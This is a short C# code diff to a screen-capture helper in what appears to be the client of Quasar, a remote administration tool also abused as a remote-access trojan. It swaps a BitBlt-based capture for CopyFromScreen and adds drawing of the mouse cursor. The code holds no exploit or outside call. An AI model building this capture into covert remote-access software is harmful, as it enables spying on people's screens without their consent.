@@ -8,8 +8,6 @@ namespace Quasar.Client.Helper
 {
     public static class ScreenHelper
     {
-        private const int SRCCOPY = 0x00CC0020;
-
         public static Bitmap CaptureScreen(int screenNumber)
         {
             Rectangle bounds = GetBounds(screenNumber);
@@ -17,14 +15,8 @@ namespace Quasar.Client.Helper
 
             using (Graphics g = Graphics.FromImage(screen))
             {
-                IntPtr destDeviceContext = g.GetHdc();
-                IntPtr srcDeviceContext = NativeMethods.CreateDC("DISPLAY", null, null, IntPtr.Zero);
-
-                NativeMethods.BitBlt(destDeviceContext, 0, 0, bounds.Width, bounds.Height, srcDeviceContext, bounds.X,
-                    bounds.Y, SRCCOPY);
-
-                NativeMethods.DeleteDC(srcDeviceContext);
-                g.ReleaseHdc(destDeviceContext);
+                g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
+                CaptureCursor(g, bounds);
             }
 
             return screen;
@@ -33,6 +25,16 @@ namespace Quasar.Client.Helper
         public static Rectangle GetBounds(int screenNumber)
         {
             return Screen.AllScreens[screenNumber].Bounds;
+        }
+
+        private static void CaptureCursor(Graphics g, Rectangle bounds)
+        {
+            Cursor cursor = Cursors.Default;
+            Point cursorPosition = Cursor.Position;
+
+            cursorPosition.Offset(-bounds.X, -bounds.Y);
+
+            cursor.Draw(g, new Rectangle(cursorPosition, cursor.Size));
         }
     }
 }
